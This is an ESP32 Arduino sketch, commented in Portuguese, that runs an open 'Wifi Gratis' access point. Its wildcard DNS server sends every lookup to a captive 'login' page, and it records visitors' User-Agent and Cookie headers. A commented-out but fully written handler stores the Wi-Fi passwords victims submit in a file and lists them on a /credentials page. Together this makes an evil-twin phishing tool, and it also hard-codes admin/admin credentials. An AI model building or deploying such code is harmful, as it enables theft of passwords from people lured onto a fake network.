#include <Arduino.h>
#include "FS.h"
#include <LITTLEFS.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <time.h>

// Defina o SSID e a senha do ponto de acesso
const char *ssid = "Wifi Gratis";
const char *password = "";

const char* http_username = "admin";
const char* http_password = "admin";

// Crie instâncias para o servidor web e o DNSServer
DNSServer dnsServer;
WebServer server(80);
IPAddress apIP(8,8,4,4); // The default android DNS
const byte DNS_PORT = 53;

// Página HTML de login
#include "paginas.h"

// Variáveis para armazenar dados de login
String inputPassword = "";

void handleNotFound() {
  server.send(404, "text/plain", "Not Found");
}
void handleRoot() {
  if (!server.authenticate(http_username, http_password)) {
    return server.requestAuthentication();
  }
  server.send(200, "text/html", loginPage);
}

void setup() {
    Serial.begin(115200);
    if(!LittleFS.begin(true)){
        Serial.println("LittleFS Mount Failed");
        return;
    }

    Serial.println("LittleFS Mount ok");
    delay(500);

    // Configuração do ponto de acesso
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, password);
    Serial.println("Ponto de acesso iniciado");
    Serial.print("IP do ponto de acesso: ");
    Serial.println(WiFi.softAPIP());

    // WiFi.softAP("ESP32-DNSServer");
    // WiFi.softAPConfig(apIP, apIP, IPAddress(192, 168, 4, 1));

    // if DNSServer is started with "*" for domain name, it will reply with
    // provided IP to all DNS request
    dnsServer.start(DNS_PORT, "*", apIP);



    server.on("/", handleRoot);
    // server.on("/login", handleLogin);
    // server.on("/login", handleRoot);
    server.on("/inline", []() {
        server.send(200, "text/plain", "this works without need of authentification");
    });

    server.onNotFound(handleRoot);

    //here the list of headers to be recorded
    const char * headerkeys[] = {"User-Agent", "Cookie"} ;
    size_t headerkeyssize = sizeof(headerkeys) / sizeof(char*);
    //ask server to track these headers
    server.collectHeaders(headerkeys, headerkeyssize);
    server.begin();
    Serial.println("HTTP server started");

    // server.onNotFound([]( AsyncWebServerRequest *request ) { request->send(200, "text/html", loginPage); });

    // server.on("/save", HTTP_POST, [](AsyncWebServerRequest *request) {
    //     if (request->hasParam("password", true)) {

    //         inputPassword = request->getParam("password", true)->value();

    //         // Verifique o login (aqui você pode adicionar a verificação real do usuário)
    //         if ( inputPassword != "" ) {

    //         Serial.println(WiFi.SSID() + ": " + inputPassword);

    //         File file = LittleFS.open("wifi_credentials.txt", FILE_APPEND);
    //         if (!file) {
    //             Serial.println("Failed to open file for writing");
    //             return;
    //         }
    //         file.println(inputPassword);
    //         file.close();
    //         request->send(200, "text/html", "<h1> Algo deu errado :( </h1>");

    //         } 
    //         else   request->send(200, "text/html", "Dados incompletos!");
    //     } 
    //     else  request->send(400, "text/html", "Bad Request");
    // });

    // server.on("/credentials", HTTP_GET, [](AsyncWebServerRequest *request){
    //     String html = "<html><body><h1>Credenciais Salvas</h1>";
    //     File file = LittleFS.open("/wifi_credentials.txt", FILE_READ);
    //     if (file) {
    //     while (file.available()) {
    //         html += file.readStringUntil('\n') + "<br>";
    //     }
    //     file.close();
    //     } else {
    //     html += "Erro ao abrir o arquivo";
    //     }
    //     html += "</body></html>";
    //     request->send(200, "text/html", html);
    // });

    server.begin();
}

void loop() { 
    dnsServer.processNextRequest();
    server.handleClient();
    delay(2);
 }
